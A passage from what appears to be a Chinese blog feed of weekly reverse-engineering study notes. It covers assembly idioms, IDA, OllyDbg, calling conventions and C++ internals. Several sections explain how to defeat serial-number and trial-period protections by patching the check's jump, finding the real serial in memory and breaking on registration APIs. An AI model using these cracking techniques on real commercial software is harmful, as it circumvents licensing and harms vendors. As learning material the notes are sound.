<p>如果编译时设置优化选项为“Maximize Speed”，编译器会用&quot;dec eax&quot;代替cmp指令。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ecx</span><br><span class="line">lea eax,[esp]</span><br><span class="line">push eax</span><br><span class="line">push 0040804c</span><br><span class="line">call 004010A1   ;scanf</span><br><span class="line">mov eax,[esp+8] ;将输入的值传给eax</span><br><span class="line">add esp,00000008</span><br><span class="line"></span><br><span class="line">dec dax         ;检查eax是否为1h</span><br><span class="line">je 00401055</span><br><span class="line">                ;zf记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</span><br><span class="line">                ;je:等于则转移(检测zf=1) </span><br><span class="line"></span><br><span class="line">(同理也可使用sub eax,xxxxxx判断是否为其他值)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="转移指令机器码的计算">转移指令机器码的计算</h3>
<p>短转移：无条件和有条件的<em>机器码均为2字节</em>，范围为-128~127（2^8）<br>
长转移：无条件的机器码为<u>5字节</u>，条件转移为<u>6字节</u>。因为无条件用一个字节（jmp）表示转移类型；条件转移用2个字节（如je、jns），用其他四个字节表示偏移量<br>
子程序调用指令：调用的参数不涉及寄存器、栈等值的类似于长转移；涉及的例如“call dword ptr [eax+2]”  比较复杂，不表（…）<br>
条件转移指令的范围是16位遗留下的。<br>
cpu开发人员只给目的地址分配了1字节（8位），将跳转的长度限制在225字节之内</p>
<p>无条件短转移的机器码形式为:“EBxx”。B00H~EB4F是向后转移，EB80~EBFFH是向前转移</p>
<p>转移指令的机器码形式为：<br>
位移量=目的地址-起始地址-跳转指令本身长度<br>
转移指令机器码=转移类别机器码(如前文中的EB）+位移量</p>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%B9%E6%8D%AE%E4%BD%8D%E7%A7%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A7%BB%E7%9A%84%E6%84%8F%E4%B9%89">https://brubbish.github.io/34199.html#根据位移进行转移的意义</a></p>
</blockquote>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFC6O.png" alt="jmp 401005对应机器码EB03"></p>
<h1>python爬虫学习</h1>
<p>记录的有点乱，还没整理好<br>
学习的原因是 看了某个论坛上一个学了几周爬虫 后用其爬的结果回答的答主 遂感牛逼，再加上有时候想学点别的作为调节（🤦‍）<br>
<a href="https://brubbish.github.io/710f8e5f.html">https://brubbish.github.io/710f8e5f.html</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.08-2020.03.15</title>
    <url>/232092d7.html</url>
    <content><![CDATA[<h1>IDA</h1>
<h2 id="枚举">枚举</h2>
<p>‘View’-&gt;‘Open subviews’-&gt;‘Enumerations’ 打开枚举窗口，按’Insert’插入新的枚举类型，按’N’添加成员<br>
选中需要重新定义的数据，按’M’后将其转换<br>
<img src="https://s1.ax1x.com/2020/03/12/8etGNT.md.png" alt="8etGNT.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/12/8etJ4U.md.png" alt="8etJ4U.md.png"></p>
<span id="more"></span>
<h2 id="FLIRT">FLIRT</h2>
<p>库文件快速识别与鉴定技术<br>
在一系列编译器的标准库文件里自动找出调用的函数，如，把’call 406E40’识别为’call strlen’<br>
如果没有自动识别出来，可以强制使用编译器特征文件（xxxx.sig）<br>
‘View’-&gt;‘Open subviews’-&gt;'Signatures’或’Shift+F5’打开签名窗口，右键’Apply new signature’选择签名文件</p>
<h2 id="（不知道把这部分叫作啥）">（不知道把这部分叫作啥）</h2>
<ol>
<li></li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/12/8eOmin.md.png" alt="可见，可以把004010c9的内容改了让程序显示'OK'"></p>
<p><img src="https://s1.ax1x.com/2020/03/14/8lFm6K.png" alt="Assmeble修改汇编指令，Apply patches to input file...将修改保存到文件"><br>
2.<br>
输入输出等函数可在name窗口中查看</p>
<h1>32位软件逆向技术</h1>
<h2 id="启动函数">启动函数</h2>
<p>Windows程序执行并不是由WinMain函数开始的，首先执行的是启动函数的相关代码（由编译器生成），完成后才调用WinMain函数</p>
<p>c/c++程序的启动函数作用基本相同，包括 检索指向新进程的<u>命令行</u>指针、检索指向新进程的<u>环境变量</u>指针、全局变量初始化和内存栈初始化等</p>
<p><img src="https://s1.ax1x.com/2020/03/12/8maVFP.md.png" alt="某程序启动代码（部分）"><br>
分析程序的过程中可以略过启动代码，直接将重点放到WinMain函数上</p>
<h2 id="函数">函数</h2>
<p>通过call…ret把函数调用和其他跳转指令区别开<br>
直接调用：call <u>函数首地址</u><br>
间接调用：call [<u> eax </u>] (通过寄存器传递函数地址或动态计算函数地址)</p>
<h3 id="函数的参数">函数的参数</h3>
<p>函数传递参数有3种方式：栈方式、寄存器方式、通过全局变量进行隐含参数传递方式<br>
每一种机制与使用的编译语言有关</p>
<h4 id="利用栈传递参数">利用栈传递参数</h4>
<p>函数计算结束后，由调用者或函数本身修改栈，使栈恢复原样（<strong>平衡栈数据</strong>）<br>
调用约定：为了实现函数调用而建立的协议（按照什么顺序入栈；由谁来平衡栈…）</p>
<ol>
<li>c规范(__cdecl)函数按照从右到左的顺序入栈，由调用者负责清除栈（c/c++/mfc(微软基础类库)默认调用约定）</li>
<li>stdcall调用约定按照从右到左传递参数，并由调用的函数在返回前清理传送参数的内存栈</li>
<li>stdcall调用约定是Win32 API采用的约定方式，在Win32 API种也有一些函数采用(__cdecl)调用，如wsprintf</li>
</ol>
<p>c、c++、pascal 等高级语言的子程序执行过程基本相似：</p>
<ol>
<li>调用者将函数执行完毕时应返回的地址和参数压入栈</li>
<li>子程序通过’ebp 指针+偏移量’对栈中的操作进行寻址</li>
<li>子程序使用ret或retf返回，此时cpu将eip置为栈中保存的地址</li>
</ol>
<p>栈的操作对象只能是双操作数（占4个字节）<br>
<img src="https://s1.ax1x.com/2020/03/14/8lP1De.md.png" alt="一个凑行数的图"></p>
<p>用ebp存取栈<br>
用ret平衡栈时，在ret指令后加一个操作数，表示在ret指令后给esp加上操作数  如’ret 8’相当于在返回后将esp+8，ret后面的值等于参数个数*4h</p>
<p>enter 和 leave指令可以帮助进行栈的维护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enter xxxx,0   ;0表示创建xxxx大小的空间来放置局部变量</span><br><span class="line">....</span><br><span class="line">leave </span><br><span class="line">ret 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter的作用为：</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,xxxx</span><br><span class="line"></span><br><span class="line">leave的作用为：</span><br><span class="line">add esp,xxxx</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ENTER 有两个操作数：第一个是常数，定义为局部变量保存的堆栈空间字节数；第二个定义了过程的词法嵌套级。<br>
ENTER numbytes, nestinglevel<br>
Numbytes 总是向上舍入为 4 的倍数，以便 ESP 对齐双字边界。Nestinglevel 确定了从主调过程堆栈帧复制到当前帧的堆栈帧指针的个数。</p>
</blockquote>
<h4 id="利用寄存器传递参数">利用寄存器传递参数</h4>
<p>绝大多数编译器都遵循fastcall规范<br>
不同的编译器实现的fastcall稍有不同</p>
<h4 id="名称修饰约定">名称修饰约定</h4>
<p>c++编译器会按照某种规则改写每一个入口点的符号名，从而允许同一个名字有多个用法且不破坏链接器。这种技术称为名称改编或名称修饰<br>
在vc++种，函数修饰名由编译类型(c/c++)、函数名、类（class）名、调用约定、返回类型等决定<br>
<img src="https://s1.ax1x.com/2020/03/15/83ZkQA.png" alt="常见的c和c++编译函数名的修饰"></p>
<h3 id="函数的返回值">函数的返回值</h3>
<p>最常见的是return操作符，还有通过参数 按 传引用方式 返回值、通过全局变量返回值</p>
<h4 id="用return操作符返回值">用return操作符返回值</h4>
<p>一般情况下返回值放在eax中，如果超过大小，高32位就会放在edx<br>
对于一个返回两个参数和的子函数：<br>
<img src="https://s1.ax1x.com/2020/03/15/83eB4S.png" alt="圈起来的即为存放返回值的过程"><br>
对应c语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    temp=x+y;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="通过参数按传引用方式返回值">通过参数按传引用方式返回值</h3>
<p>传递参数的方式有：传值和传引用<br>
传值调用时会建立参数的一份复本，并把它传给调用参数<br>
传引用允许调用函数修改原始变量的值（指针）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*a&lt;*b)</span><br><span class="line">        *a=*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/15/83uRHI.png" alt=" "></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.23-2020.03.29</title>
    <url>/50551.html</url>
    <content><![CDATA[<h1>32位软件逆向技术</h1>
<h2 id="控制语句">控制语句</h2>
<h3 id="条件设置指令（SETcc）">条件设置指令（SETcc）</h3>
<p>条件设置指令的形式是“SET<u>cc</u> r/m8”， r/m8表示8位寄存器或单字节内存单元<br>
条件设置指令测试一些标志位，把结果记录的目标操作数中<br>
测试：</p>
<ol>
<li>of（=1溢出）</li>
<li>zf（=1操作后等于0/相等）</li>
<li>cf（=1进位/低于）</li>
<li>cf、zf结合判断</li>
<li>sf（=1操作后结果为负）</li>
<li>pf（=1，1个数为偶数）</li>
<li>sf、of结合判断（=1小于）</li>
<li>zf（=1或zf!=of，不大于）</li>
</ol>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">https://brubbish.github.io/34199.html#标志寄存器</a></p>
</blockquote>
 <span id="more"></span>
<p>条件设置指令可以用来消除程序中的转移指令<br>
如：<br>
<img src="https://s1.ax1x.com/2020/03/22/8IMgHA.png" alt=" "></p>
<h3 id="纯算法实现逻辑判断">纯算法实现逻辑判断</h3>
<p>一些编译器在优化的时候，会不改变原逻辑的情况下，使用数学技巧把代码中的一些逻辑分支语句转换为算术操作，减少程序中的条件转移指令，提高cpu的流水线的性能（…tql)</p>
<h2 id="循环语句">循环语句</h2>
<p>可以进行反向引用<br>
其他类型的分支语句，如if-else都是由低地址向高地址区域引用的（向下跳），依此可以将循环语句识别出来（调回去）<br>
确定某段代码是循环代码后就可以分析计数器（一般用ecx）</p>
<p>如果编译时设置优化“Maximize Speed”：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx             ;变量初始化sum=0</span><br><span class="line">xor eax,eax             ；变量初始化i=0</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h2 id="数学运算符">数学运算符</h2>
<p>如果编译器没有进行优化，则这些运算符很容易理解（…)所以下面都是经过优化的</p>
<h3 id="整数的加法和减法">整数的加法和减法</h3>
<p>用lea代替add和sub<br>
lea指令允许用户在一个时钟内完成对c=a+b+78h（某个数）的计算，其中abc都是在有寄存器的情况下才有效的，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea c,[a+b+78]</span><br><span class="line">=&gt;</span><br><span class="line">mov eax,dword ptr [esp]     ;eax=a</span><br><span class="line">mov ecx,dword ptr [esp]     ;ecx=b</span><br><span class="line">lea edx,dword ptr [ecx+eax+78]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>时钟周期：一个时钟脉冲所需要的时间。（计组）</p>
</blockquote>
<h3 id="整数的乘法">整数的乘法</h3>
<p>一般被编译成mul（无符号）、imul（有符号）指令（运行慢），为了提高效率会用其他指令完成<br>
如果一个数是2的幂，用左移指令shl；3、5、6、7、9等数用加法提高效率：如把exa*5写成&quot;lea eax,[eax+4 *4];lea指令可以实现寄存器乘以2、4、8的运算</p>
<h3 id="整数的除法">整数的除法</h3>
<p>一般被编译成div、idiv指令，大概比乘法运算多消耗10倍cpu时钟<br>
如果除数是2的幂，可用右移指令’shr a,n’：a是被除数，n是2的指数（进行无符号数计算）有符号数用sar指令</p>
<p>除法指令需要用到符号扩展指令cdq，作用是把eax中的数视为有符号数，将eax的最高位（符号位）扩展到edx中。如果eax最高位是1，执行后edx=FFFFFFFF;如果是0，edx=00000000。通过这种方法把32位有符号数变为edx：eax的64位有符号数，满足64位运算指令的需要。</p>
<p>对除法优化时会用乘法代替除法，优化的公式较多，一例如：倒数相乘a*b=a *(1/b)</p>
<p>（在下面的64位中描述更完整）</p>
<h2 id="文本字符串">文本字符串</h2>
<h3 id="字符寻址指令">字符寻址指令</h3>
<p>与字符指针处理相关的指令有mov、lea等<br>
mov指令将地址/寄存器中的数据放到目的寄存器中，如mov eax [401000]/[ecx]<br>
lea（load effective address）操作数是地址,lea eax,[addr] 就是把addr的地址放入eax中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea eax,[401000]</span><br><span class="line">等价于</span><br><span class="line">mov eax,401000</span><br></pre></td></tr></table></figure>
<h3 id="计算字符串长度">计算字符串长度</h3>
<p>c语言的strlen()：<br>
<img src="https://s1.ax1x.com/2020/03/25/8xCwqg.png" alt=" "></p>
<h1>64位软件逆向技术</h1>
<p>x64通用寄存器的名称第一个字母由e改为r，共16个；16个128位xmm寄存器（通常用于优化代码）<br>
<img src="https://s1.ax1x.com/2020/03/25/8xCDaj.png" alt=" "></p>
<h2 id="函数">函数</h2>
<h3 id="栈平衡">栈平衡</h3>
<p>每8字节的栈空间用来保存一个数据<br>
尽量保证栈顶对齐值为16（可以被16整除）</p>
<h3 id="调用约定">调用约定</h3>
<p>x86（32位）的函数调用有stdcall、__cdecl、fastcall等，x64只有一种寄存器快速调用约定：</p>
<ol>
<li>整数：前四个参数用寄存器rcx→rdx→r8→r9，其余放在栈里，入栈顺序从右到左，任何大于8字节或不是1、2、4、8字节的参数用地址传递</li>
<li>浮点数：前四个参数用xmm寄存器完成：xmm0→xmm1→xmm2→xmm3</li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/25/8xCBZQ.png" alt=" "></p>
<p>栈为函数的前四个参数预留了32字节的空间，当函数功能复杂时将寄存器的参数保存到这个预留栈空间。预览栈空间由函数调用者申请、平衡</p>
<h2 id="数学运算">数学运算</h2>
<h3 id="整数的除法-2">整数的除法</h3>
<ol>
<li>有符号数，除数为2^n<br>
x&gt;=0,x/2^n=x&gt;&gt;n<br>
x&lt;0,x/2^n=（x+（2^n-1））&gt;&gt;n<br>
除数为-2^n时最后用’neg 寄存器’指令求补</li>
<li>有符号数，除数为正，非2^n<br>
32位：x&gt;=0,result=(x<em>c&gt;&gt;32)+x&gt;&gt;n,&lt;0时结果再+1<br>
64位：x&gt;=0,result=(x</em>c&gt;&gt;64)+x&gt;&gt;n,&lt;0时结果再+1</li>
<li>有符号数，除数为负，非2^n<br>
32位：x&gt;=0,result=(x<em>c&gt;&gt;32)-x&gt;&gt;n,&lt;0时结果再+1<br>
64位：x&gt;=0,result=(x</em>c&gt;&gt;64)-x&gt;&gt;n,&lt;0时结果再+1</li>
</ol>
<ul>
<li>c为魔数</li>
</ul>
<ol start="4">
<li>无符号数，除数位2^n<br>
用shr右移</li>
<li>无符号数，除数非2^n<br>
32位：x&gt;=0,result=x<em>c&gt;&gt;32&gt;&gt;n<br>
62位：x&gt;=0,result=x</em>c&gt;&gt;62&gt;&gt;n</li>
</ol>
<h2 id="整数取模">整数取模</h2>
<p>可以用除法指令，但是除法指令执行周期较长，通常优化将其转换成位运算或除法运算，再用除法运算进行优化</p>
<ol>
<li>除数b=2^n<br>
取得被除数二进制数的最后n位，负数要在n位之前补1：<br>
x&gt;=0,result=x&amp;(b-1);x&lt;0,result=(x&amp;(b-1))-1|(~b-1)+1</li>
<li>除数b!=2^n<br>
采用“余数=被除数-商<em>除数”<br>
result=x-x/b</em>b</li>
</ol>
<h1>使用 OllyDbg 从零开始 Cracking</h1>
<h2 id="数制系统">数制系统</h2>
<p>十六进制负数</p>
<p>从00000000~FFFFFFFF<br>
正数：00000000~7FFFFFFF<br>
负数：80000000~FFFFFFFF(-1)<br>
在od左下角的commandbar可查询十六进制数的十进制值和对应的ASCII字符：<u>? [十六进制值]</u></p>
<h2 id="寄存器">寄存器</h2>
<h3 id="标志寄存器">标志寄存器</h3>
<p><img src="https://s1.ax1x.com/2020/04/02/GGxsMQ.png" alt=" "></p>
<ol>
<li>
<p>o，溢出标志<br>
记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0</p>
</li>
<li>
<p>p，奇偶标志<br>
指令的结果用二进制表示时1的总数，如果为偶数PF=1，如果不为偶数PF=0</p>
</li>
<li>
<p>z，零标志<br>
记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</p>
</li>
<li>
<p>s，符号标志<br>
运算结果为负设置为1，结果为正设置为0</p>
</li>
<li>
<p>c，进位标志<br>
记录了无符号运算的结果是否有向更高位的进位（9位），有置1，无置0</p>
</li>
<li>
<p>其他</p>
</li>
</ol>
<h1>python爬虫学习</h1>
<p><a href="https://brubbish.github.io/710f8e5f.html##%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://brubbish.github.io/710f8e5f.html##正则表达式</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.30-2020.04.05</title>
    <url>/20849.html</url>
    <content><![CDATA[<h1>关于上周博客炸了的问题</h1>
<p>原因是两个_config.yml（可能还有其他文件吧）里所有缩进都不见了…不知道是为啥，就甩给 vscode 和格式化代码插件吧（…)<br>
然后，原来 .yml 要用缩进表示层级啊…<br>
嗯顺便换了个主题</p>
<h1>64 位软件逆向技术</h1>
<h2 id="虚函数">虚函数</h2>
<p>c++的三大核心机制是封装、继承、多态，虚函数是多态的一种体现。在逆向过程中，虚函数是一种还原面向对象代码的重要手段</p>
<h3 id="虚表">虚表</h3>
<p>不同的类虚表不同，相同的类对象共享一个虚表<br>
（以下讲的是用 c++写的程序）<br>
在构造函数中，首先初始化虚表指针，然后初始化数据成员，最后返回 this 指针</p>
<span id="more"></span>
<p>c++语法规定，析构函数需要调用虚函数的无多态性，因此析构函数首先需要赋值虚表<br>
构造函数和析构函数特征一致，可根据调用的先后顺序确定<br>
虚表地址在全局数据区中</p>
<h1>序列号（注册码）保护方式</h1>
<h2 id="序列号保护机制">序列号保护机制</h2>
<p>验证用户名和序列号之间的映射关系（…也有可能没有关系）<br>
检查方法：</p>
<ol>
<li>将用户名等信息通过变换后得到注册码<br>
序列号=F（用户名）<br>
这个方法计算出的序列号以明文形式在内存中出现<br>
也可通过修改比较指令的方法通过检查<br>
再现了生成注册码的过程，不安全</li>
<li>通过注册码验证用户名<br>
生成注册码时：序列号=F（用户名），检查注册码时：用户名=F^（-1）（序列号）<br>
生成注册码的函数和注册码明文未出现在软件代码中<br>
破解可考虑：1.修改比较指令，2.通过 F^(-1)找出 F</li>
<li>通过对等函数检查<br>
F1（用户名）=F2（序列号）<br>
与 2 类似</li>
<li>同时将用户名和序列号作为自变量<br>
特定值=F（用户名，序列号）<br>
可能失去了用户名和序列号的一一对应关系</li>
</ol>
<h2 id="攻击序列号保护机制">攻击序列号保护机制</h2>
<p>找到序列号或修改判断序列号后的跳转指令<br>
跟踪程序启动时（需要将注册码读出并判断）或输入注册码，对 api 设置断点<br>
常用：</p>
<ol>
<li>
<p>将输入的内容复制到缓冲区： GetWindowTextA(W)、GetDlgItemTextA(W)、GetDlgItemInt</p>
</li>
<li>
<p>判断后显示的对话框：MessageBoxA(W)、MessageBoxExA(W)、ShowWindow、MessageBoxIndirectA(W)、CreateDialogParamA(W)、CreateDialogIndirectParamA(w)、DialogBoxParamA(W)、DialogBoxIndirectParamA(W)</p>
</li>
<li>
<p>启动时读取注册码：<br>
RegQueryValueExA(W)(序列号放在注册表);<br>
GetPrivateProfileStringA(W)、GetPrivateProfileIntA(W)、GetProfileIntA(W)、GetProfileStringA(W)(序列号放在 INI 文件中);<br>
CreateFileA(W)、_lopen()(放在一般文件)</p>
</li>
</ol>
<h3 id="数据约束性">数据约束性</h3>
<p>只用在明文比较注册码的保护方式中使用。大多数情况下，真正的注册码会在某个时刻出现在内存中，一般会在用户输入的 ±90h。<br>
例如，用 od 按’Alt+M’打开内存窗口，'Ctrl+B’打开搜索框，搜索输入的序列号，可在附近查找到真序列号</p>
<h3 id="利用消息断点">利用消息断点</h3>
<p>按下和释放鼠标时会发送 WM_LBUTTONDOWN 和 WM_LUBTTONUP 消息，用这个消息下断点可以找到按钮的事件代码</p>
<h3 id="利用提示信息">利用提示信息</h3>
<p>当输入错时提示“序列号错误，再来一次”等，可以查找相应的字符串，定位到相关代码<br>
如 od 中，右键“search for”-&gt;“all referenced text string”</p>
<h2 id="字符串比较形式">字符串比较形式</h2>
<ol>
<li>寄存器直接比较</li>
<li>函数比较<br>
比较内容放在寄存器或栈中<br>
call 一个用于比较的函数，可能是 api 函数或自己写的</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call ....</span><br><span class="line">test eax,eax</span><br><span class="line">jz   ....      ;zf=1-&gt;eax=0 跳转</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>串比较</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea edi [   ] ;edi指向字符串a</span><br><span class="line">lea esi [   ] ;....</span><br><span class="line">repz cmpsd    ;比较</span><br></pre></td></tr></table></figure>
<p>edi、esi：变址寄存器，存放存储单元在段内的偏移量。<br>
rep：按 ecx 中指定次数或在 zf 不满足条件前重复。<br>
如果 ds:si 和 es:di 所指向的两个字节相等，则继续比较。REP（重复）、REPE（相等时重复）、REPNE（不相等时重复）、REPZ（为零时重复）及 REPNZ（不为零时重复）<br>
<img src="https://s1.ax1x.com/2020/04/02/GGvR3D.png" alt=" "><br>
CMPSB 比较字节 CMPSW 比较字 CMPSD 比较双字 ,方向标志位决定 ESI 和 EDI 的增加或减少</p>
<h1>警告窗口</h1>
<p>常用的方法是修改程序的资源、静态分析、动态分析<br>
显示窗口的常用函数有 MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)等，对某些警告窗口无效时可以尝试利用消息设置断点拦截</p>
<h1>时间限制</h1>
<h2 id="计时器">计时器</h2>
<p>对于限制每次运行时长的软件</p>
<ol>
<li>setTimer 函数<br>
应用程序在初始化时调用这个 api 函数，申请计时器并设定时间间隔，同时获得一个处理计时器超时的回调函数。若超时，系统会向申请的窗口发送 WM_TIMER 或调用那个回调函数。当程序不需要计时器，调用 KillTimer()进行销毁</li>
<li>高精度多媒体计时器<br>
调用 timeSetEvent()</li>
<li>其它<br>
timeGetTime()、GetTickCount()，返回的都是系统启动以来经历过的时间，函数的精度取决于系统的设置；也可以利用各高级语言开发库里的函数实现计时，如 c 语言里的 time()（返回 1970.01.01 0 时起至今的秒数）</li>
</ol>
<p>精度太高会对系统性能造成影响，故一般不需要太高精度。</p>
<h2 id="时间限制">时间限制</h2>
<p>试用期<br>
在安装软件或主程序第一次运行时获得系统日期并记录。程序每次运行都要去的当前系统日期并与之前的记录比较<br>
软件一般最少要保存两个时间值，一个是安装（运行）日期（最好存在多个地方），一个是软件最近一次运行的日期（防止用户修改机器日期）<br>
用于获取时间的 api 函数有 GetSystemTime、GetLocalTime、GetFileTime，即使不直接使用这些函数，高级语言中封装的类也调用了这些函数。<br>
还有一种方法是读取需要频繁修改的系统文件，利用 FileTimeToSystem()</p>
<h1>面向对象（OOP）涉及到的几个名词</h1>
<p>主要是因为加密与解密里涉及到了（如虚函数）但不懂是啥．．．．</p>
<h2 id="类（class）-对象">类（class）&amp;对象</h2>
<p>类是用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例<br>
当我们定义一个 class 的时候，我们实际上就定义了一种数据类型。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数定义</span></span><br><span class="line">      <span class="built_in">Box</span>(<span class="keyword">double</span> l=<span class="number">2.0</span>, <span class="keyword">double</span> b=<span class="number">2.0</span>, <span class="keyword">double</span> h=<span class="number">2.0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         cout &lt;&lt;<span class="string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;</span><br><span class="line">         length = l;</span><br><span class="line">         breadth = b;</span><br><span class="line">         height = h;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">Volume</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(Box box)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>-&gt;<span class="built_in">Volume</span>() &gt; box.<span class="built_in">Volume</span>();</span><br><span class="line">         <span class="comment">// 每一个对象都能通过this 指针访问自己的地址</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">private</span>:             <span class="comment">//类成员的属性，还可为private 或 protected</span></span><br><span class="line">      <span class="keyword">double</span> length;   <span class="comment">// 盒子的长度</span></span><br><span class="line">      <span class="keyword">double</span> breadth;  <span class="comment">// 盒子的宽度</span></span><br><span class="line">      <span class="keyword">double</span> height;   <span class="comment">// 盒子的高度</span></span><br><span class="line">&#125;;</span><br><span class="line">Box Box1;          <span class="comment">// 声明对象 Box1，类型为 Box</span></span><br><span class="line">Box Box2;          <span class="comment">// 声明对象 Box2，类型为 Box</span></span><br></pre></td></tr></table></figure>
<p>构造函数：实现对象初始化<br>
析构函数：释放对象占用的内存空间<br>
类的作用：安全、继承</p>
<h2 id="继承">继承</h2>
<p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据一个类来定义另一个类，这使得创建和维护一个应用程序变得更容易。这样做，也达到了重用代码功能和提高执行效率的效果。<br>
当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类、父类或超类，新建的类称为派生类或子类。<br>
继承代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物。<br>
如果一个实例的数据类型是某个子类，那么它的数据类型也可以看作是父类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         width = w;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         height = h;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">protected</span>:</span><br><span class="line">      <span class="keyword">int</span> width;</span><br><span class="line">      <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaintCost</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getCost</span><span class="params">(<span class="keyword">int</span> area)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> area * <span class="number">70</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (width * height);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//多继承，即一个子类可以有多个父类，它继承了多个父类的特性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape, <span class="keyword">public</span> PaintCost</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getwhatever</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (width * height *height);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="多态">多态</h2>
<p>多态按字面的意思就是多种形态。存在的必要条件：继承、重写（子类对父类的方法做一定修改）、父类引用指向子类的对象<br>
当子类和父类都存在相同的方法时，子类覆盖了父类的方法</p>
<blockquote>
